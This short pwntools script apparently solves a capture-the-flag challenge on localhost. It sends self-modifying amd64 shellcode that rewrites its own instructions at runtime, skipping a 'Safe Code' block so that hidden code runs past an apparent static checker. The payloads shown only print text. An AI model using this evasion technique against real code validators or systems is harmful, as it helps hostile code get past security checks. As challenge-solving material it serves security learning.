from pwn import *
context.update(
    arch="amd64",
    endian="little",
    os="linux",
    # log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

p = remote("localhost", 11111)
# p = process(["python3", "chall.py"])

block = ""
block += shellcraft.echo("Safe Code\n")
block += shellcraft.exit(0)
block = asm(block)

payload = b""
payload += asm("mov DWORD PTR [rip+8], 0x2e")
payload += asm("mov BYTE PTR [rip], 0xe8")
payload += b"\x90"*5 
payload += block
payload += asm(shellcraft.echo("Malicous Code\n"))
payload = payload.hex()
p.sendlineafter(b"Enter your program:", payload)

p.interactive()